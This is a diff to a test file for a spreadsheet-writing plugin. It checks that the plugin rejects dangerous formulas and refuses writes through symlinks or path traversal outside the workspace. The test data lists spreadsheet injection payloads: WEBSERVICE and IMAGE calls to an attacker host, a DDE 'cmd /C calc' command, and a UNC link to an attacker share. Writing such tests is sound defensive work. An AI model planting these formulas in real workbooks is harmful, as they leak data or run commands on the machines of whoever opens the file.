@@ -1,5 +1,5 @@
 import { describe, expect, test } from "bun:test";
-import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from "node:fs/promises";
+import { mkdir, mkdtemp, readFile, readdir, rm, symlink, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
@@ -240,7 +240,7 @@ describe("OpenWorkSpreadsheets", () => {
         ["B2", "number", "SUM(C1:C1)"],
       ]);
 
-      for (const formula of ['WEBSERVICE("http://attacker.invalid/")', "cmd|' /C calc'!A0", "rtd(\"prog\",,\"x\")", "'[Book1.xlsx]Sheet1'!A1", "IMAGE(\"http://attacker.invalid/p.png\")", "  "]) {
+      for (const formula of ['WEBSERVICE("http://attacker.invalid/")', "cmd|' /C calc'!A0", "rtd(\"prog\",,\"x\")", "'[Book1.xlsx]Sheet1'!A1", "[Book1]Sheet1!A1", "'\\\\attacker\\share\\[book]Sheet1'!A1", "IMAGE(\"http://attacker.invalid/p.png\")", "  "]) {
         await expect(write(plugin, { path: "unsafe.xlsx", sheets: [{ rows: [[{ formula }]] }] })).rejects.toThrow(/Formula in A1 .*only calculations inside the workbook are written/);
       }
       await expect(readFile(join(root, "unsafe.xlsx"))).rejects.toThrow();
@@ -270,6 +270,14 @@ describe("OpenWorkSpreadsheets", () => {
         await expect(read(plugin, { path: "linked/secret.xlsx" })).rejects.toThrow("resolves outside the active workspace");
         await expect(write(plugin, { path: "../escape.xlsx", sheets: [{ rows: [["x"]] }] })).rejects.toThrow("outside the active workspace");
         await expect(write(plugin, { path: "linked/escape.xlsx", sheets: [{ rows: [["x"]] }] })).rejects.toThrow("resolves outside the active workspace");
+        // A missing folder under a symlinked folder must not be created at the link target.
+        await expect(write(plugin, { path: "linked/new/deeper/escape.xlsx", sheets: [{ rows: [["x"]] }] })).rejects.toThrow("resolves outside the active workspace");
+        await expect(readdir(outside)).resolves.toEqual(["secret.xlsx"]);
+        await expect(readdir(join(root, "linked"))).resolves.toEqual(["secret.xlsx"]);
+        // A symlinked destination file is refused even with overwrite.
+        await symlink(join(outside, "secret.xlsx"), join(root, "alias.xlsx"));
+        await expect(write(plugin, { path: "alias.xlsx", overwrite: true, sheets: [{ rows: [["x"]] }] })).rejects.toThrow("is a symbolic link");
+        expect((await readFile(join(outside, "secret.xlsx"))).byteLength).toBeGreaterThan(0);
         await expect(write(plugin, { path: "notes.csv", sheets: [{ rows: [["x"]] }] })).rejects.toThrow("only creates .xlsx");
         await expect(read(plugin, { path: "missing.xlsx" })).rejects.toThrow("was not found in the workspace");
         await expect(read(plugin, { path: "legacy.xls" })).rejects.toThrow("Legacy .xls");
